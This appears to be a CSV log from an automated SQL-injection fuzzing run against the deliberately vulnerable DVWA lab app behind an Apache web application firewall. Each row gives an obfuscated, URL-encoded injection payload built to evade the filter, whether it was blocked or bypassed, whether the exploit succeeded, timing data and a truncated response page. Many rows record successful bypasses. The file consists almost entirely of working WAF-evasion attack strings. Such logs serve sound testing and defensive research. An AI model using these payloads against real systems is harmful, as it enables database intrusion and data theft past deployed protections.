Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27<@=1+or+not%0b{x+(select%0b1)}=1=+(!%7e0,Bypassed,Yes,Yes (unionAtk),Unknown,0.0479,73.97,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||%0bnot+true=+(!%7efalse)+||,Bypassed,No,None,Unknown,0.0526,73.97,No,500,
0'<@=.1+||%0bnot%0b{a+1}=1=+(not+1),Blocked,No,None,Unknown,0.0523,73.97,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1+||%0bnot%0b{x+(select+1)}=1=%0b(not+{a,Blocked,No,None,Unknown,0.031,74.1,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1+||+!%0b{a%0b1}=1=%0b(not+{x%0b(select,Bypassed,Yes,Yes (unionAtk),Unknown,0.0519,74.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1%0b||+{x+(select%0b1)}=1+like%0b{x%0b(select%0b1)}=1+,Bypassed,No,None,Unknown,0.0499,74.23,No,500,
0%27<@=.1+or+0=+(!+{x%0b(select%0b1)}=1),Bypassed,Yes,Yes (unionAtk),Unknown,0.0691,74.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0bor+!+1=+(not+{a%0b1}=1),Bypassed,No,None,Unknown,0.041,74.23,No,500,
0'<@=1.+||+not%0b{x+(select+1)}=1=+(!%0b,Bypassed,No,None,Unknown,0.0491,74.23,No,500,
0'<@=1.+or%0bnot+1=%0b(not+{x+(select+,Bypassed,No,None,Unknown,0.0344,74.23,No,500,
0'<@=.1%0bor+not+{a+1}=1=+(!+{x+(select,Bypassed,No,None,Unknown,0.0209,74.23,No,500,
0'<@!=1+||+!%0b{x%0b(select+1)}=1=+(!+{`if`,Bypassed,No,None,Unknown,0.0249,74.23,No,500,
0%27<@!=.1+||+not%0b{x%0b(select+1)}=1=%0b(not+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0319,74.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27or+@<@.%0b||+not+{x+(select%0b1)}=1=+(not,Blocked,No,None,Unknown,0.0159,74.23,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.%0bor%0b{x+(select+1)}=1%0blike+{x+(select+1)}=1+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0272,74.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1+||%0bnot+{`if`+1}=1=%0b(!%0b{x+(select,Bypassed,Yes,Yes (unionAtk),Unknown,0.0177,74.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.%0bor+not+{`if`+1}=1=%0b(!+{a%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.0401,74.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+or+!%0b1=+(!+{a%0b1}=1),Bypassed,No,None,Unknown,0.0142,74.23,No,500,
0%27<@!=.1%0bor+!%0b{`if`+1}=1=%0b(not%0b{x+(select,Bypassed,Yes,Yes (unionAtk),Unknown,0.0303,74.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+or+not%7e0=%0b(!+{a+1}=1),Bypassed,Yes,Yes (unionAtk),Unknown,0.0212,74.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+||+not+{x%0b(select%0b1)}=1=%0b(!+,Bypassed,No,None,Unknown,0.0186,74.23,No,500,
0%27<@!=.1+or+!~0=%0b(!%0b{x+(select+1)}=1,Bypassed,Yes,Yes (unionAtk),Unknown,0.0297,74.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+or%0b!%0b{x%0b(select%0b1)}=1=+(not%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.0246,74.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+||+not+{a+1}=1=%0b(not+1),Bypassed,Yes,Yes (unionAtk),Unknown,0.0271,74.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+||+!%0b{a+1}=1=+(!+{x+(select,Bypassed,Yes,Yes (unionAtk),Unknown,0.0183,74.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0b||+0=+(!+{`if`+1}=1)+or,Bypassed,Yes,Yes (unionAtk),Unknown,0.0229,74.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0bor+!+{a%0b1}=1=+(not%0btrue),Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0334,74.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or%0b!+{a+1}=1=%0b(!+{`if`%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.022,74.48,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0bor%0bnot+{a+1}=1=%0b(0)+or,Bypassed,No,None,Unknown,0.0311,74.48,No,500,
0%27<@=.1+or%0b!+{`if`%0b1}=1=+(not+{x+(select,Bypassed,Yes,Yes (unionAtk),Unknown,0.0263,74.48,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0b||+not+{x%0b(select+1)}=1=%0b(not+{`if`,Bypassed,No,None,Unknown,0.0194,74.58,No,500,
0%27<@!=1.%0bor+!+true=%0b(not+{x%0b(select+1)}=1,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0238,74.85,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||+not%7efalse=+(not%0b{`if`%0b1}=1),Bypassed,No,None,Unknown,0.0207,74.85,No,500,
0'<@!=1%0b||+!+{x%0b(select%0b1)}=1=+(not+{x,Bypassed,No,None,Unknown,0.0118,74.85,No,500,
0%27<@=1.%0b||%0bnot%0b{x+(select+1)}=1=+(not+{x,Bypassed,Yes,Yes (unionAtk),Unknown,0.0272,74.85,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1%0bor+!+{a+1}=1=%0b(!+1),Bypassed,No,None,Unknown,0.0177,74.85,No,500,
0'<@!=1.+or%0bnot%0b{x+(select+1)}=1=+(not%0b{x,Blocked,No,None,Unknown,0.0073,74.85,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1%0bor+not%0btrue=%0b(not%0b1)+or,Bypassed,No,None,booleanAtk,0.0126,74.85,No,500,
0'<@!=1+||%0b{x+(select+1)}=1+like%0b{x+(select+1)}=1+,Bypassed,No,None,Unknown,0.0179,74.85,No,500,
0'<@!=1+or%0bnot+true=%0b(!%7efalse)+||,Bypassed,No,None,booleanAtk,0.0091,74.85,No,500,
0'<@=1.%0b||%0bnot%0b{x%0b(select+1)}=1=+(!%0b{x,Bypassed,No,None,Unknown,0.0104,74.85,No,500,
0'<@=.1+||%0bnot~false=+(not%0b{`if`+1}=1),Bypassed,No,None,Unknown,0.0156,74.85,No,500,
0'<@!=.1+or%0bnot%0b{x%0b(select%0b1)}=1=+(not%0b{x,Blocked,No,None,Unknown,0.0084,74.85,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1%0b||%0b!+{x%0b(select+1)}=1=%0b(!%7e0,Bypassed,Yes,Yes (unionAtk),Unknown,0.0129,74.85,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+or+!%0b{x+(select+1)}=1=+(not%0b,Bypassed,No,None,Unknown,0.01,74.85,No,500,
0'<@!=1%0b||%0bnot%0b{x%0b(select+1)}=1=+(!+{x,Bypassed,No,None,Unknown,0.0075,74.85,No,500,
0%27<@=1+||%0bnot%0b{`if`%0b1}=1=+(false)%0bor,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0144,74.48,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or%0bnot+{a%0b1}=1=%0b(not+true),Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0261,74.48,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0b||+!%0b{`if`+1}=1=+(not~0),Bypassed,No,None,Unknown,0.0217,74.67,No,500,
0'<@=.1+||%0b!+{`if`%0b1}=1+is+false+or%27,Bypassed,No,None,booleanAtk,0.0201,74.85,No,500,
0%27<@=.1+or+not%0b{x+(select+1)}=1=+(not+1,Bypassed,Yes,Yes (unionAtk),Unknown,0.0235,74.85,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+or+not+{x%0b(select+1)}=1=+(!%0b{x,Bypassed,Yes,Yes (unionAtk),Unknown,0.0223,74.85,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
